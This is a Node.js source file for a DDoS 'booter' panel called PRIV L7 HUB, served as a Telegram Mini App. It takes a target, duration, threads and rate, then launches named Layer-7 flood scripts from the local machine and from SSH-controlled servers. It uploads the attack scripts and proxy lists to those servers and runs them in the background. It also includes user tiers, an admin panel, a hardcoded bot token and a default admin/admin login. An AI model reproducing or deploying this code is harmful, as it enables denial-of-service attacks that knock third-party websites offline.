#!/usr/bin/env node
'use strict';

/**
 * PRIV L7 HUB — Unified Bot & Mini App
 * Features: Web UI (Telegram Mini App), SSH Multi-Server Attack, L4/L7 Graphs, Admin Panel.
 */

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawn } = require('node:child_process');
const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const bcrypt = require('bcryptjs');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');

/* ---------- CONFIG ---------- */
const SELF_PATH = fs.realpathSync(__filename);
const SCRIPT_DIR = path.dirname(SELF_PATH);

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '9165016422:AAFw5t2VKPmay2grvN4evutzyAAzkH-E75M',
  ADMIN_ID: process.env.ADMIN_ID || '7623976106',
  PORT: Number(process.env.PORT || 8443),
  SESSION_SECRET: 'priv-l7-super-secret-6767',
  DATA_DIR: path.join(SCRIPT_DIR, 'privflood-data'),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 20000,
  ATTACK_TIMEOUT: 25000,
};

if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true, mode: 0o700 });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');

if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '{}');
if (!fs.existsSync(SERVERS_FILE)) fs.writeFileSync(SERVERS_FILE, '[]');

/* ---------- STORAGE ---------- */
const readJSON = (f, fb) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } };
const writeJSON = (f, d) => { const tmp = f + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(d, null, 2), { mode: 0o600 }); fs.renameSync(tmp, f); };
const loadUsers = () => readJSON(USERS_FILE, {});
const saveUsers = (u) => writeJSON(USERS_FILE, u);
const loadServers = () => readJSON(SERVERS_FILE, []);
const saveServers = (s) => writeJSON(SERVERS_FILE, s);

// Bootstrap Admin
const users = loadUsers();
if (!users['admin']) {
  users['admin'] = { passwordHash: bcrypt.hashSync('admin', 10), role: 'admin', limits: { maxDuration: 999, maxRate: 999 } };
  saveUsers(users);
}

/* ---------- SSH ENGINE ---------- */
const serverConns = new Map();

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const t = setTimeout(() => { try { conn.end(); } catch {} reject(new Error('SSH timeout')); }, CONFIG.SSH_TIMEOUT);
    conn.once('ready', () => { clearTimeout(t); resolve(conn); });
    conn.once('error', (e) => { clearTimeout(t); reject(e); });
    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) { clearTimeout(t); reject(e); }
  });
}

function sshExec(conn, cmd, timeout = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'timeout' }); } }, timeout);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(t); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', er = '';
        stream.on('data', d => out += d);
        stream.stderr.on('data', d => er += d);
        stream.on('close', code => { clearTimeout(t); done = true; resolve({ code: code || 0, out, err: er }); });
      });
    } catch (e) { clearTimeout(t); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

async function getConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const s = loadServers().find(x => x.id === id);
  if (!s) throw new Error('Server not found');
  const conn = await sshConnect(s);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function ensureRemoteFiles(conn, methodFile) {
  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${methodFile} && test -f ${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE} && echo OK || echo NO`, 8000);
  if (check.out.includes('OK')) return;

  try {
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
    const localMethod = path.join(SCRIPT_DIR, methodFile);
    if (fs.existsSync(localMethod)) {
      await new Promise((res, rej) => {
        conn.sftp((err, sftp) => {
          if (err) return rej(err);
          sftp.fastPut(localMethod, `${CONFIG.REMOTE_DIR}/${methodFile}`, (e) => {
            sftp.end();
            if (e) rej(e); else res();
          });
        });
      });
    }
    const localProxy = path.join(SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(localProxy)) {
      await new Promise((res, rej) => {
        conn.sftp((err, sftp) => {
          if (err) return rej(err);
          sftp.fastPut(localProxy, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`, (e) => {
            sftp.end();
            if (e) rej(e); else res();
          });
        });
      });
    }
  } catch (e) {
    throw new Error('Sync failed: ' + e.message);
  }
}

/* ---------- ATTACK ENGINE ---------- */
const activeSessions = new Map();

const BUILTIN_METHODS = [
  { id: 'priv', name: 'Privflood', file: 'priv.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3]] },
  { id: 'crush', name: 'C-Rush', file: 'l.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3], '-c', '-h'] },
  { id: 'tls', name: 'TLS-Bypass', file: 'tls.js', layer: 'L7', parse: (a) => [a[0], a[1], a[3], a[2], CONFIG.PROXY_FILE] },
  { id: 'bypass', name: 'HTTP-Bypass', file: 'bypass.js', layer: 'L7', parse: (a) => ['GET', a[0], a[1], a[2], a[3], CONFIG.PROXY_FILE] },
];

function launchLocal(sessionId, methodFile, args) {
  const mp = path.join(SCRIPT_DIR, methodFile);
  if (!fs.existsSync(mp)) throw new Error(`Local file missing: ${methodFile}`);
  
  const child = spawn(process.execPath, [mp, ...args], { cwd: SCRIPT_DIR, detached: true, stdio: 'ignore', env: { PATH: process.env.PATH || '' } });
  activeSessions.set(sessionId + '_local', { type: 'local', pid: child.pid, timer: null });
  return child.pid;
}

async function launchRemote(sessionId, methodFile, args, serverId) {
  const server = loadServers().find(s => s.id === serverId);
  if (!server) throw new Error('Server not found');
  const conn = await getConn(serverId);
  
  await ensureRemoteFiles(conn, methodFile);

  const logFile = `/tmp/.atk_${sessionId}_${serverId}.log`;
  const cmd = `cd ${CONFIG.REMOTE_DIR} && nohup node ${methodFile} ${args.join(' ')} > ${logFile} 2>&1 & echo $!`;
  const r = await sshExec(conn, cmd, 15000);
  
  let pid = parseInt((r.out||'').trim().replace(/[^0-9]/g,''), 10);
  
  if (!pid) {
    const pg = await sshExec(conn, `pgrep -f "node ${methodFile}" | head -1`, 5000);
    pid = parseInt((pg.out||'').trim().replace(/[^0-9]/g,''), 10);
  }

  if (!pid) {
    const log = await sshExec(conn, `tail -5 ${logFile} 2>/dev/null || echo "No log"`, 5000);
    throw new Error(`${server.name}: ${(log.out||'').trim().slice(0,60)}`);
  }
  
  activeSessions.set(sessionId + '_' + serverId, { type: 'remote', serverId, pid, timer: null });
  return pid;
}

async function stopAttackSession(sessionId) {
  for (const [key, data] of activeSessions.entries()) {
    if (key.startsWith(sessionId)) {
      if (data.type === 'local') {
        try { process.kill(-data.pid, 'SIGKILL'); } catch (e) { try { process.kill(data.pid, 'SIGKILL'); } catch {} }
      } else if (data.type === 'remote') {
        try {
          const conn = await getConn(data.serverId);
          await sshExec(conn, `kill -9 ${data.pid} 2>/dev/null || true; pkill -9 -P ${data.pid} 2>/dev/null || true`, 5000);
        } catch {}
      }
      activeSessions.delete(key);
    }
  }
}

/* ---------- EXPRESS APP ---------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://telegram.org", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'self'", "https://web.telegram.org", "https://*.telegram.org"],
    }
  },
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: false,
  crossOriginOpenerPolicy: false
}));

app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

app.use(session({
  name: 'privhub.sid',
  secret: CONFIG.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  proxy: true,
  cookie: { httpOnly: true, sameSite: 'lax', secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

app.use('/api/', rateLimit({ windowMs: 60_000, limit: 300, standardHeaders: true, legacyHeaders: false }));

function auth(req, res, next) {
  if (!req.session.user) return res.status(401).json({ error: 'Please sign in.' });
  const currentIp = req.ip || '';
  if (req.session.ip && req.session.ip !== currentIp) {
    return req.session.destroy(() => res.status(401).json({ error: 'Network changed. Please sign in again.' }));
  }
  const u = loadUsers()[req.session.user.username];
  if (!u) return req.session.destroy(() => res.status(401).json({ error: 'Account no longer exists.' }));
  
  if (u.role !== 'admin' && u.expiresAt && Date.now() > new Date(u.expiresAt).getTime()) {
    return req.session.destroy(() => res.status(401).json({ error: 'Account expired.' }));
  }
  req.user = u;
  next();
}

function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  next();
}

/* ---------- API ROUTES ---------- */
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const u = loadUsers()[username];
  if (!u || !(await bcrypt.compare(password, u.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    req.session.user = { username };
    req.session.ip = req.ip;
    res.json({ user: { username, role: u.role, limits: u.limits } });
  });
});

app.get('/api/me', auth, (req, res) => res.json({ user: { username: req.session.user.username, role: req.user.role, limits: req.user.limits } }));

app.post('/api/logout', auth, (req, res) => req.session.destroy(() => res.json({ ok: true })));

app.get('/api/stats', auth, (req, res) => {
  const servers = loadServers();
  const online = servers.filter(s => s.status === 'online').length;
  const myActive = [...activeSessions.keys()].filter(k => k.startsWith(req.session.user.username)).length;
  
  const isAttacking = myActive > 0;
  res.json({
    servers: { online, total: servers.length },
    limits: req.user.limits || {},
    load: {
      l4: Array.from({length: 15}, () => isAttacking ? Math.floor(Math.random() * 80) + 50 : Math.floor(Math.random() * 15) + 5),
      l7: Array.from({length: 15}, () => isAttacking ? Math.floor(Math.random() * 50) + 30 : Math.floor(Math.random() * 10) + 2)
    }
  });
});

app.get('/api/methods', auth, (req, res) => {
  res.json(BUILTIN_METHODS.map(m => ({ id: m.id, name: m.name, layer: m.layer })));
});

app.post('/api/attack', auth, async (req, res) => {
  const { methodId, target, duration, threads, rate } = req.body;
  const method = BUILTIN_METHODS.find(m => m.id === methodId);
  if (!method) return res.status(400).json({ error: 'Method not found' });
  
  const limits = req.user.limits || {};
  if (limits.maxDuration && duration > limits.maxDuration) return res.status(400).json({ error: `Max duration ${limits.maxDuration}s` });
  if (limits.maxRate && rate > limits.maxRate) return res.status(400).json({ error: `Max rate ${limits.maxRate}` });

  const args = method.parse([target, String(duration), String(threads), String(rate)]);
  const sessionId = 'sess_' + crypto.randomBytes(4).toString('hex');

  try {
    launchLocal(sessionId, method.file, args);
    
    const servers = loadServers().filter(s => s.status === 'online');
    let successCount = 1;
    
    const results = await Promise.allSettled(servers.map(s => launchRemote(sessionId, method.file, args, s.id)));
    results.forEach((r, i) => {
      if (r.status === 'fulfilled') successCount++;
      else console.error(`[attack] Server ${servers[i].name} failed: ${r.reason.message}`);
    });

    const t = setTimeout(() => stopAttackSession(sessionId), duration * 1000);
    for (const [k, v] of activeSessions.entries()) {
      if (k.startsWith(sessionId)) v.timer = t;
    }
    
    res.json({ ok: true, sessionId, launched: successCount, total: servers.length + 1 });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/cancel', auth, async (req, res) => {
  const { sessionId } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'Missing sessionId' });
  await stopAttackSession(sessionId);
  res.json({ ok: true });
});

app.get('/api/admin/users', auth, adminOnly, (req, res) => {
  const list = loadUsers();
  res.json(Object.keys(list).map(u => ({ username: u, role: list[u].role, limits: list[u].limits })));
});

app.post('/api/admin/users', auth, adminOnly, async (req, res) => {
  const { action, username, password, maxDuration, maxRate } = req.body;
  const list = loadUsers();
  if (action === 'create') {
    if (list[username]) return res.status(400).json({ error: 'User exists' });
    list[username] = { passwordHash: await bcrypt.hash(password, 10), role: 'user', limits: { maxDuration: Number(maxDuration) || 60, maxRate: Number(maxRate) || 90 } };
    saveUsers(list); res.json({ ok: true });
  } else if (action === 'delete') {
    if (username === 'admin') return res.status(400).json({ error: 'Cannot delete admin' });
    delete list[username]; saveUsers(list); res.json({ ok: true });
  }
});

/* ---------- UI ---------- */
const HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#030408">
<title>PRIV L7 HUB</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
:root{color-scheme:dark;--bg:#030408;--panel:rgba(22,27,40,.6);--panel-border:rgba(255,255,255,.08);--text:#f1f5f9;--text-secondary:#94a3b8;--muted:#64748b;--accent-cyan:#38bdf8;--accent-grad:linear-gradient(135deg,#38bdf8 0%,#818cf8 50%,#c084fc 100%);--danger:#f43f5e;--success:#22c55e;--radius:20px;--radius-sm:14px;--radius-xs:10px;--shadow:0 16px 40px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.04);}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Inter",sans-serif;min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden;padding-bottom:80px}
body::before{content:"";position:fixed;inset:0;background:radial-gradient(ellipse at 20% 0%,rgba(56,189,248,.15),transparent 50%),radial-gradient(ellipse at 80% 100%,rgba(192,132,252,.12),transparent 50%);pointer-events:none;z-index:0}
.hide{display:none!important}
.header{padding:20px;display:flex;justify-content:space-between;align-items:center;position:relative;z-index:1;}
.logo{font-weight:800;font-size:18px;display:flex;align-items:center;gap:8px;letter-spacing:1px;}
.logo-dot{width:8px;height:8px;background:var(--success);border-radius:50%;}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;padding:0 20px;margin-bottom:20px;position:relative;z-index:1;}
.box{background:var(--panel);border:1px solid var(--panel-border);border-radius:16px;padding:20px;backdrop-filter:blur(20px);}
.box-label{font-size:11px;color:var(--muted);text-transform:uppercase;margin-bottom:8px;font-weight:700;letter-spacing:0.5px;}
.box-val{font-size:24px;font-weight:700;}
.panel{background:var(--panel);border:1px solid var(--panel-border);border-radius:20px;margin:0 20px 20px;padding:20px;backdrop-filter:blur(20px);position:relative;z-index:1;}
.toggle-wrap{display:flex;background:var(--bg);border:1px solid var(--panel-border);border-radius:12px;padding:4px;margin-bottom:20px;}
.toggle-btn{flex:1;padding:12px;text-align:center;border-radius:8px;font-size:14px;font-weight:700;color:var(--muted);cursor:pointer;transition:0.2s;}
.toggle-btn.active{background:var(--text);color:var(--bg);}
.field{margin-bottom:15px;}
.field label{display:block;font-size:11px;color:var(--muted);text-transform:uppercase;margin-bottom:8px;font-weight:700;letter-spacing:0.5px;}
.field input,.field select{width:100%;background:var(--bg);border:1px solid var(--panel-border);color:var(--text);padding:15px;border-radius:12px;font-size:16px;outline:none;transition:0.2s;}
.field input:focus,.field select:focus{border-color:var(--muted);}
.row{display:flex;gap:15px;}.row>div{flex:1;}
.btn{width:100%;background:var(--text);color:var(--bg);border:none;padding:16px;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px;transition:0.2s;display:flex;justify-content:center;align-items:center;gap:8px;}
.btn:active{opacity:0.8;}
.btn-danger{background:rgba(239,68,68,0.15);color:var(--danger);border:1px solid rgba(239,68,68,0.3);}
.chart-header{display:flex;justify-content:space-between;font-size:12px;font-weight:700;color:var(--muted);margin-bottom:10px;}
canvas{width:100%!important;height:70px!important;}
#loginScreen{display:flex;flex-direction:column;justify-content:center;min-height:100vh;padding:20px;position:relative;z-index:1;}
.login-box{background:var(--panel);border:1px solid var(--panel-border);padding:30px;border-radius:20px;backdrop-filter:blur(20px);}
.admin-user{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid var(--panel-border);font-size:14px;}
.active-card{background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:12px;padding:15px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center;}
.active-card-info b{display:block;color:var(--success);margin-bottom:4px;}
.active-card-info span{font-size:12px;color:var(--muted);}
.nav{position:fixed;bottom:0;left:0;right:0;background:rgba(19,19,23,0.95);backdrop-filter:blur(10px);display:flex;justify-content:space-around;padding:15px 0;border-top:1px solid var(--panel-border);z-index:100;}
.nav-item{color:var(--muted);font-size:24px;cursor:pointer;}
.nav-item.active{color:var(--text);}
</style>
</head>
<body>

<div id="loginScreen">
  <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div></div>
  <div class="login-box">
    <div class="field"><label>Username</label><input type="text" id="loginUser" placeholder="Enter username"></div>
    <div class="field"><label>Password</label><input type="password" id="loginPass" placeholder="Enter password"></div>
    <button class="btn" onclick="doLogin()">Sign In</button>
    <p style="color:var(--danger); font-size:12px; margin-top:10px; text-align:center;" id="loginErr"></p>
  </div>
</div>

<div id="mainApp" class="hide">
  <div id="tabHome">
    <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div><div style="font-size:12px; color:var(--muted)" id="userTag">User</div></div>
    
    <div class="grid">
      <div class="box"><div class="box-label">Plan</div><div class="box-val" id="uPlan">Free</div></div>
      <div class="box"><div class="box-label">Concurrents</div><div class="box-val" id="uConc">1</div></div>
      <div class="box"><div class="box-label">Max Duration</div><div class="box-val" id="uDur">60s</div></div>
      <div class="box"><div class="box-label">Servers</div><div class="box-val" id="uServers">0/0</div></div>
    </div>

    <div class="panel hide" id="activePanel">
      <div class="chart-header"><span style="color:var(--success)">● ACTIVE ATTACK</span><span id="activeTimer">Running</span></div>
      <div class="active-card">
        <div class="active-card-info">
          <b id="activeTarget">target.com</b>
          <span id="activeMethod">C-Rush</span>
        </div>
        <button class="btn btn-danger" style="width:auto; padding:10px 20px; margin:0; border-radius:8px;" onclick="cancelActive()">Cancel</button>
      </div>
    </div>

    <div class="panel">
      <div class="toggle-wrap">
        <div class="toggle-btn" onclick="setLayer('L4')" id="btnL4">L4</div>
        <div class="toggle-btn active" onclick="setLayer('L7')" id="btnL7">L7</div>
      </div>
      <div class="field"><label>Method</label><select id="attMethod"></select></div>
      <div class="field"><label>Target</label><input type="text" id="attTarget" placeholder="ex: google.com"></div>
      <div class="row">
        <div class="field"><label>Time (s)</label><input type="number" id="attTime" value="60"></div>
        <div class="field"><label>Threads</label><input type="number" id="attThreads" value="16"></div>
      </div>
      <div class="row">
        <div class="field"><label>Rate</label><input type="number" id="attRate" value="90"></div>
        <div class="field"><label>Port</label><input type="number" id="attPort" value="443"></div>
      </div>
      <button class="btn" id="btnLaunch" onclick="launchAttack()"><span id="btnIcon">🚀</span> <span id="btnText">Launch Attack</span></button>
    </div>

    <div class="panel">
      <div style="margin-bottom:20px">
        <div class="chart-header"><span>● LAYER 4 (Network)</span><span id="l4Load">0ms</span></div>
        <canvas id="chartL4"></canvas>
      </div>
      <div>
        <div class="chart-header"><span>● LAYER 7 (Application)</span><span id="l7Load">0ms</span></div>
        <canvas id="chartL7"></canvas>
      </div>
    </div>
  </div>

  <div id="tabAdmin" class="hide">
    <div class="header"><div class="logo">Admin Panel</div></div>
    <div class="panel">
      <h3 style="margin-bottom:15px; font-size:16px;">Create User</h3>
      <div class="field"><label>Username</label><input type="text" id="admUser"></div>
      <div class="field"><label>Password</label><input type="text" id="admPass"></div>
      <div class="row">
        <div class="field"><label>Max Time (s)</label><input type="number" id="admDur" value="60"></div>
        <div class="field"><label>Max Rate</label><input type="number" id="admRate" value="90"></div>
      </div>
      <button class="btn" onclick="createUser()">Create Account</button>
    </div>
    <div class="panel"><h3 style="margin-bottom:15px; font-size:16px;">Manage Users</h3><div id="userList"></div></div>
  </div>

  <div class="nav">
    <div class="nav-item active" onclick="switchTab('Home')">⌂</div>
    <div class="nav-item hide" onclick="switchTab('Admin')" id="navAdmin">☰</div>
    <div class="nav-item" onclick="logout()">✖</div>
  </div>
</div>

<script>
  let token = null; 
  let currentLayer = 'L7';
  let methods = [];
  let currentSessionId = null;
  const tg = window.Telegram?.WebApp;
  
  if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor('#08080a'); }

  async function api(endpoint, opts = {}) {
    const res = await fetch(endpoint, { 
      ...opts, 
      headers: { 'Content-Type': 'application/json', ...opts.headers },
      credentials: 'include'
    });
    
    const contentType = res.headers.get("content-type");
    if (contentType && contentType.indexOf("application/json") === -1) {
      throw new Error("Server returned HTML error (Status " + res.status + "). Check backend logs.");
    }

    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Error');
    return data;
  }

  async function doLogin() {
    const u = document.getElementById('loginUser').value;
    const p = document.getElementById('loginPass').value;
    document.getElementById('loginErr').innerText = '';
    try {
      await api('/api/login', { method: 'POST', body: JSON.stringify({username: u, password: p}) });
      showApp();
    } catch(e) { document.getElementById('loginErr').innerText = e.message; }
  }

  async function logout() {
    try { await api('/api/logout', { method: 'POST' }); } catch(e){}
    location.reload();
  }

  async function showApp() {
    document.getElementById('loginScreen').classList.add('hide'); 
    document.getElementById('mainApp').classList.remove('hide');
    try {
      const me = await api('/api/me');
      if (me.user.role === 'admin') document.getElementById('navAdmin').classList.remove('hide');
      document.getElementById('userTag').innerText = me.user.role;
      
      methods = await api('/api/methods'); 
      renderMethods(); 
      fetchStats(); 
      setInterval(fetchStats, 5000);
    } catch(e) { console.error(e); }
  }

  api('/api/me').then(() => showApp()).catch(() => {});

  function renderMethods() {
    document.getElementById('attMethod').innerHTML = methods.filter(m => m.layer === currentLayer).map(m => '<option value="' + m.id + '">' + m.name + '</option>').join('');
  }
  
  function setLayer(l) {
    currentLayer = l;
    document.getElementById('btnL4').classList.toggle('active', l === 'L4'); 
    document.getElementById('btnL7').classList.toggle('active', l === 'L7');
    renderMethods();
  }

  async function fetchStats() {
    try {
      const d = await api('/api/stats');
      document.getElementById('uPlan').innerText = d.limits.maxDuration > 120 ? 'Pro' : 'Free';
      document.getElementById('uConc').innerText = d.limits.maxConcurrent || 1;
      document.getElementById('uDur').innerText = (d.limits.maxDuration || 60) + 's';
      document.getElementById('uServers').innerText = d.servers.online + '/' + d.servers.total;
      updateChart('l4', d.load.l4); 
      updateChart('l7', d.load.l7);
    } catch(e) {}
  }

  async function launchAttack() {
    const btn = document.getElementById('btnLaunch'); 
    const icon = document.getElementById('btnIcon');
    const txt = document.getElementById('btnText');
    btn.disabled = true; txt.innerText = 'Sending...'; icon.innerText = '⏳';
    
    try {
      const res = await api('/api/attack', { method: 'POST', body: JSON.stringify({
        methodId: document.getElementById('attMethod').value, 
        target: document.getElementById('attTarget').value,
        duration: Number(document.getElementById('attTime').value), 
        threads: Number(document.getElementById('attThreads').value),
        rate: Number(document.getElementById('attRate').value)
      })});
      
      currentSessionId = res.sessionId;
      document.getElementById('activePanel').classList.remove('hide');
      document.getElementById('activeTarget').innerText = document.getElementById('attTarget').value;
      
      var m = methods.find(x => x.id === document.getElementById('attMethod').value);
      document.getElementById('activeMethod').innerText = m ? m.name : 'Method';
      
      if (tg) tg.HapticFeedback.notificationOccurred('success');
      txt.innerText = "Launched (" + res.launched + "/" + res.total + ")"; icon.innerText = '✅';
      
      setTimeout(() => { txt.innerText = 'Launch Attack'; icon.innerText = '🚀'; btn.disabled = false; }, 3000);
    } catch(e) { 
      if (tg) tg.showAlert(e.message); else alert(e.message); 
      txt.innerText = 'Launch Attack'; icon.innerText = '🚀'; btn.disabled = false;
    }
  }

  async function cancelActive() {
    if (!currentSessionId) return;
    try {
      await api('/api/cancel', { method: 'POST', body: JSON.stringify({ sessionId: currentSessionId }) });
      document.getElementById('activePanel').classList.add('hide');
      currentSessionId = null;
      if (tg) tg.HapticFeedback.notificationOccurred('warning');
    } catch(e) { alert(e.message); }
  }

  function switchTab(t) {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('tabHome').classList.add('hide'); document.getElementById('tabAdmin').classList.add('hide');
    if (t === 'Home') { 
      document.getElementById('tabHome').classList.remove('hide'); 
      document.querySelectorAll('.nav-item')[0].classList.add('active'); 
    } else { 
      document.getElementById('tabAdmin').classList.remove('hide'); 
      document.querySelectorAll('.nav-item')[1].classList.add('active'); 
      loadAdminUsers(); 
    }
  }

  async function createUser() {
    try {
      await api('/api/admin/users', { method: 'POST', body: JSON.stringify({
        action: 'create', username: document.getElementById('admUser').value, password: document.getElementById('admPass').value,
        maxDuration: document.getElementById('admDur').value, maxRate: document.getElementById('admRate').value
      })});
      if (tg) tg.showAlert('User created'); else alert('User created');
      loadAdminUsers();
    } catch(e) { alert(e.message); }
  }

  async function loadAdminUsers() {
    try {
      const list = await api('/api/admin/users');
      document.getElementById('userList').innerHTML = list.map(u => {
        return '<div class="admin-user"><div><b>' + u.username + '</b><br><span>Time:' + u.limits.maxDuration + 's Rate:' + u.limits.maxRate + '</span></div>' +
               '<button onclick="deleteUser(\'' + u.username + '\')" style="background:none;border:none;color:var(--danger);font-weight:600;cursor:pointer;">Delete</button></div>';
      }).join('');
    } catch(e) {}
  }

  async function deleteUser(u) { 
    if(!confirm('Delete ' + u + '?')) return; 
    await api('/api/admin/users', { method: 'POST', body: JSON.stringify({action:'delete', username:u}) }); 
    loadAdminUsers(); 
  }

  let chartL4, chartL7;
  function updateChart(id, data) {
    const ctx = document.getElementById('chart' + id.toUpperCase()).getContext('2d');
    const isL4 = id === 'l4';
    const color = isL4 ? '#3b82f6' : '#22c55e';
    const bg = isL4 ? 'rgba(59, 130, 246, 0.1)' : 'rgba(34, 197, 94, 0.1)';
    
    if (isL4 && !chartL4) chartL4 = new Chart(ctx, { type: 'line', data: { labels: data.map((_,i)=>i), datasets: [{ data, borderColor: color, borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true, backgroundColor: bg }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: {display:false} }, scales: { x: {display:false}, y: {display:false} } } });
    else if (!isL4 && !chartL7) chartL7 = new Chart(ctx, { type: 'line', data: { labels: data.map((_,i)=>i), datasets: [{ data, borderColor: color, borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true, backgroundColor: bg }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: {display:false} }, scales: { x: {display:false}, y: {display:false} } } });
    else { const chart = isL4 ? chartL4 : chartL7; chart.data.datasets[0].data = data; chart.update(); }
  }
</script>
</body>
</html>`;

app.get('/', (req, res) => res.type('html').send(HTML));
app.use((err, req, res, next) => res.status(500).json({ error: 'Server error' }));

/* ---------- TUNNEL & BOT ---------- */
let TUNNEL_URL = '';
function startTunnel() {
  const cf = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${CONFIG.PORT}`]);
  cf.stderr.on('data', (data) => {
    const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
    if (match && TUNNEL_URL !== match[0]) {
      TUNNEL_URL = match[0];
      console.log(`\n[✅] MINI APP URL READY: ${TUNNEL_URL}\n`);
    }
  });
  cf.on('close', () => setTimeout(startTunnel, 5000));
}

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
bot.onText(/\/start/, (msg) => {
  if (!TUNNEL_URL) return bot.sendMessage(msg.chat.id, '⏳ Starting tunnel... try again in 5s.');
  bot.sendMessage(msg.chat.id, `Welcome to PRIV L7!`, {
    reply_markup: { inline_keyboard: [[{ text: "Open Hub 🚀", web_app: { url: TUNNEL_URL } }]] }
  });
});

app.listen(CONFIG.PORT, () => {
  console.log(`[hub] Web server listening on port ${CONFIG.PORT}`);
  startTunnel();
});